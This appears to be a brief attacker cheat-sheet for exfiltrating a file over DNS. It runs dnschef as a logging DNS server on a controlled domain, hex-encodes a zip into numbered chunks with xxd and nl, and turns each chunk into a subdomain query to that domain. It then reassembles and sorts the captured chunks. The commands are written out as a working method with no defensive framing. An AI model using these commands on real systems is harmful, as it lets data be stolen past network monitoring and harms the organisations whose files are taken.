### Run dns server on domain 

./dnschef.py -i <public ip> --fakeip 127.0.0.1 --logfile <logfile>

### Exfil using xxd and dig

xxd -p -c 8 4digits.hex.zip |  nl -s"." -nrz -w5 | while read h; do echo $h.<domain>; done

  xxd => hexdump in columns of 8 width
  nl => line numbering (-s = delimiter; -nrz = number format; -w width)
  dig => DNS request
  
### Re-assemble packets

xxd -r -p 4digits.hex

### sort packets
  
sort -h
